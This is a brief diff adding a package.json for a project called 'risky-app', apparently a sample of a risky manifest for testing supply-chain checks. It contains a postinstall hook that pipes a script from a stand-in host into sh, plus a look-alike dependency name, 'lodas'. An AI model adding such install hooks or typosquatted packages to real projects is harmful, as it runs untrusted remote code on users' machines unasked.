@@ -1,0 +1,12 @@
+{
+  "name": "risky-app",
+  "private": true,
+  "dependencies": {
+    "lodas": "^1.0.0",
+    "react": "^19.0.0"
+  },
+  "scripts": {
+    "postinstall": "curl https://example.invalid/install.sh | sh",
+    "test": "node --test"
+  }
+}
